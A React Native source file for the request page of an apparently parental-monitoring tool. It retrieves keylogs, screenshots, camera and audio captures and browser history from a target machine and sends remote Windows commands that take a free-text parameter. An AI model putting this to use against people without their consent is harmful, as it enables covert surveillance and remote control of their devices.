import { React, useState, useEffect } from "react";
import { Pressable, Text, Modal, Image, ScrollView } from "react-native";
import { SafeAreaView } from "react-native-safe-area-context";
import { View, FlatList, TextInput, StyleSheet } from "react-native-web";
import { FontAwesome, MaterialIcons } from "@expo/vector-icons";
import { Picker } from "@react-native-picker/picker";
import base64 from "react-native-base64";
import ParentMenu from "../components/ParentMenu";
import { handleRefresh, removeNonAscii } from "../config/Utils";
import {
  addRequest,
  getSpecificData,
  deleteData,
  deleteAllData,
} from "../components/FetchRequest";
import { GoBackButton } from "../components/Buttons";
import { checkCmdParam } from "../components/Errors";
import global from "../config/global";
import colors from "../config/colors";
import sizes from "../config/sizes";

// Screenshot, Keylog, Camera, Audio, Lockdown, Location and History requests page

const Requests = ({ route, navigation }) => {
  const [data, setData] = useState([]);
  const [specificData, setSpecificData] = useState([]);
  const [browser, setBrowser] = useState("");
  const [refresh, setRefresh] = useState(true);
  const [modalVisible, setModalVisible] = useState(false);
  const [historyModalVisible, setHistoryModalVisible] = useState(false);
  const [cmdModalVisible, setCmdModalVisible] = useState(false);
  const [cmdType, setCmpType] = useState("");
  const [cmdParam, setCmdParam] = useState("");
  const [cmdParamError, setCmdParamError] = useState("");
  const { uid } = route.params;
  const { name } = route.params;
  const { type } = route.params;

  useEffect(() => {
    if (!refresh) return;
    fetch("https://localhost:8010/data/getAll/" + uid + "/" + type, {
      method: "GET",
      credentials: "include",
      headers: {
        Accept: "application/json",
      },
    })
      .then((response) => response.json())
      .then((responseJson) => {
        setData(responseJson);
      });
    setRefresh(false);
  }, [refresh]); //, pageCurrent]);

  const setComponentType = () => {
    switch (type) {
      case "SCREENSHOT": //bmp
        return (
          <Image
            style={{ width: "100%", height: "100%", resizeMode: "stretch" }}
            source={{ uri: "data:image/bmp;base64," + specificData }}
          />
        );
      case "CAMERA": //png
        return (
          <Image
            style={{ width: "100%", height: "100%", resizeMode: "stretch" }}
            source={{ uri: "data:image/png;base64," + specificData }}
          />
        );
      case "AUDIO": //wav
        let snd = new Audio("data:audio/wav;base64," + specificData);
        return (
          <View>
            <View>
              <Pressable style={global.ButtonList} onPress={() => snd.play()}>
                <Text style={global.ListItemText}>Play</Text>
              </Pressable>
            </View>
            <View>
              <Pressable style={global.ButtonList} onPress={() => snd.pause()}>
                <Text style={global.ListItemText}>Pause</Text>
              </Pressable>
            </View>
            <View>
              <Pressable style={global.ButtonList} onPress={() => snd.load()}>
                <Text style={global.ListItemText}>Stop</Text>
              </Pressable>
            </View>
          </View>
        );
      case "NETLOG":
        let decodedNetLog = base64.decode(specificData.toString());
        return (
          <ScrollView>
            <Text style={styles.TextInfo}>
              {decodedNetLog
                .replace(/Subject/g, "")
                .replace(/: CN=/g, "")
                .replace(/O=/g, "")
                .replace(/OU=/g, "")
                .replace(/L=/g, "")
                .replace(/S=/g, "")
                .replace(/C=/g, "")
                .replace(/\"/g, "")
                .replace(/,/g, "")}
            </Text>
          </ScrollView>
        );
      default: {
        let decodedData = base64.decode(specificData.toString());
        return (
          <ScrollView>
            <Text style={styles.TextInfo}>{removeNonAscii(decodedData).replace(/"/g, "")}</Text>
          </ScrollView>
        );
      }
    }
  };

  const setHistory = () => {
    return (
      <View>
        <Picker
          style={global.TextInput}
          selectedValue={browser}
          onValueChange={(itemValue, itemIndex) => setBrowser(itemValue)}
        >
          <Picker.Item label="Choose an option" value="" />
          <Picker.Item label="Chrome" value="Chrome" />
          <Picker.Item label="Opera" value="Opera" />
          <Picker.Item label="Brave" value="Brave" />
          <Picker.Item label="Edge" value="Edge" />
        </Picker>
      </View>
    );
  };

  const setCmdComponent = () => {
    return (
      <View>
        <View>
          <Picker
            style={global.TextInput}
            selectedValue={cmdType}
            onValueChange={(itemValue, itemIndex) => setCmpType(itemValue)}
          >
            <Picker.Item label="Choose an option" value="" />
            <Picker.Item label="Show all processes" value="tasklist" />
            <Picker.Item label="Close a program" value="taskkill /IM" />
            <Picker.Item label="Show hidden files" value="dir /AH" />
            <Picker.Item label="Show folders and files" value="dir /ON" />
          </Picker>
        </View>
        <View>{getAdditionalParam(cmdType)}</View>
        <Text style={global.ErrorMsg}>{cmdParamError}</Text>
      </View>
    );
  };

  const getAdditionalParam = (cmdType) => {
    switch (cmdType) {
      case "taskkill /IM":
      case "dir /AH":
      case "dir /ON":
        return (
          <TextInput
            style={global.TextInputInModal}
            placeholder="Additional Param"
            placeholderTextColor={colors.primary}
            onChangeText={(cmdParam) => setCmdParam(cmdParam)}
          />
        );
      default:
        break;
    }
  };

  const defineCmdAttributes = () => {
    let dataAttr;
    dataAttr = {
      REQUEST_TYPE: type,
      COMMAND_TYPE: cmdType,
      COMMAND_PARAMETER: cmdParam,
    };
    checkCmdParam(cmdParam, setCmdParamError);
    addRequest(uid, dataAttr);
  };

  const checkRequestButton = () => {
    switch (type) {
      case "KEYLOG":
        break;
      case "NETLOG":
        return (
          <Pressable
            onPress={() => setHistoryModalVisible(true)}
            style={styles.AddRequestButton}
          >
            <Text style={global.ButtonText}>Download browser history</Text>
          </Pressable>
        );
      case "COMMAND":
        return (
          <Pressable
            onPress={() => setCmdModalVisible(true)}
            style={styles.AddRequestButton}
          >
            <Text style={global.ButtonText}>Add Command request</Text>
          </Pressable>
        );
      default:
        let dataAttr = { REQUEST_TYPE: type };
        return (
          <Pressable
            onPress={() => addRequest(uid, dataAttr)}
            style={styles.AddRequestButton}
          >
            <Text style={global.ButtonText}>
              Add {type.toLowerCase()} request
            </Text>
          </Pressable>
        );
    }
  };

  return (
    <SafeAreaView style={global.PageContainer}>
      <ParentMenu navigation={navigation} />
      <View style={global.RightContainer}>
        <View>
          <GoBackButton navigation={navigation} uid={uid} name={name} />
        </View>
        <View style={global.HeaderMenu}>
          <Text style={global.HeaderText}>
            {name + " - " + type.toLowerCase()}
          </Text>
        </View>
        <View style={global.RightMenu}>
          <View style={global.ArrowView}>
            <Pressable
              style={global.ArrowButton}
              onPress={() => deleteAllData(uid, type.toUpperCase(), setRefresh)}
            >
              <MaterialIcons
                name="delete-sweep"
                size={sizes.iconSize}
                color={colors.primary}
              />
            </Pressable>
            <Pressable
              style={global.ArrowButton}
              //onPress={() => handlePreviousPage()}
            >
              <MaterialIcons
                name="navigate-before"
                size={sizes.PagingArrowIconSize}
                color={colors.primary}
              />
            </Pressable>
            <Pressable
              style={global.ArrowButton}
              //onPress={() => handleNextPage()}
            >
              <MaterialIcons
                name="navigate-next"
                size={sizes.PagingArrowIconSize}
                color={colors.primary}
              />
            </Pressable>
            <Pressable
              style={global.ArrowButton}
              onPress={() => handleRefresh(setRefresh)}
            >
              <FontAwesome
                style={global.icon}
                name="refresh"
                size={sizes.refreshIconSize}
                color={colors.primary}
              />
            </Pressable>
          </View>
          <FlatList
            keyExtractor={(item, index) => {
              return index.toString();
            }}
            data={data}
            renderItem={({ item }) => (
              <Pressable
                style={global.ButtonList}
                onPress={() => {
                  setModalVisible(true),
                    getSpecificData(uid, item.dataId, setSpecificData);
                }}
              >
                <Text style={global.ListItemText}>
                  {item.dataType} : {item.createdTimestamp} : {item.dataId}
                </Text>
                <Pressable
                  style={global.IconButton}
                  onPress={() => deleteData(item.dataId, setRefresh)}
                >
                  <FontAwesome
                    name="trash-o"
                    size={sizes.iconSize}
                    color={colors.primary}
                  />
                </Pressable>
              </Pressable>
            )}
          />
          <Modal /*Modal for showing a specific data*/
            style={global.ModalContainer}
            animationType="fade"
            transparent={true}
            visible={modalVisible}
            onRequestClose={() => setModalVisible(!modalVisible)}
          >
            <View style={global.ModalView}>
              <View style={global.ModalContainer}>
                <View style={global.TopModalView}>{setComponentType()}</View>
                <View style={global.BottomModalView}>
                  <Pressable
                    style={global.CloseButton}
                    onPress={() => {
                      setModalVisible(!modalVisible);
                    }}
                  >
                    <Text style={global.ButtonText}>Close</Text>
                  </Pressable>
                </View>
              </View>
            </View>
          </Modal>
          <Modal /* Modal for History */
            style={global.Modal}
            animationType="fade"
            transparent={true}
            visible={historyModalVisible}
            onRequestClose={() => {
              setHistoryModalVisible(!historyModalVisible);
            }}
          >
            <View style={global.ModalView}>
              <View style={global.ModalConfigContainer}>
                <View style={global.TopModalView}>{setHistory()}</View>
                <View style={global.BottomModalView}>
                  <Pressable
                    onPress={() => {
                      //defineTypeAttributes();
                    }}
                    style={global.CloseButton}
                  >
                    <Text style={global.ButtonText}>Send</Text>
                  </Pressable>
                  <Pressable
                    style={global.CloseButton}
                    onPress={() => setHistoryModalVisible(!historyModalVisible)}
                  >
                    <Text style={global.ButtonText}>Close</Text>
                  </Pressable>
                </View>
              </View>
            </View>
          </Modal>
          <Modal /* Modal for COMMAND */
            style={global.Modal}
            animationType="fade"
            transparent={true}
            visible={cmdModalVisible}
            onRequestClose={() => {
              setCmdModalVisible(!cmdModalVisible);
            }}
          >
            <View style={global.ModalView}>
              <View style={global.ModalConfigContainer}>
                <View style={global.TopModalView}>{setCmdComponent()}</View>
                <View style={global.BottomModalView}>
                  <Pressable
                    onPress={() => {
                      defineCmdAttributes();
                    }}
                    style={global.CloseButton}
                  >
                    <Text style={global.ButtonText}>Send</Text>
                  </Pressable>
                  <Pressable
                    style={global.CloseButton}
                    onPress={() => setCmdModalVisible(!cmdModalVisible)}
                  >
                    <Text style={global.ButtonText}>Close</Text>
                  </Pressable>
                </View>
              </View>
            </View>
          </Modal>
          {checkRequestButton()}
        </View>
      </View>
    </SafeAreaView>
  );
};

const styles = StyleSheet.create({
  AddRequestButton: {
    height: 50,
    alignItems: "center",
    justifyContent: "center",
    borderRadius: 6,
    borderColor: colors.borderRightColor,
    backgroundColor: colors.primary,
    fontSize: 15,
    lineHeight: 21,
    fontWeight: "bold",
    letterSpacing: 0.5,
    color: colors.secondary,
    margin: 5,
    paddingLeft: 10,
  },
  TextInfo: {
    fontSize: 15,
    letterSpacing: 0.5,
    fontWeight: "bold",
    padding: 1,
    paddingTop: 10,
  },
});

export default Requests;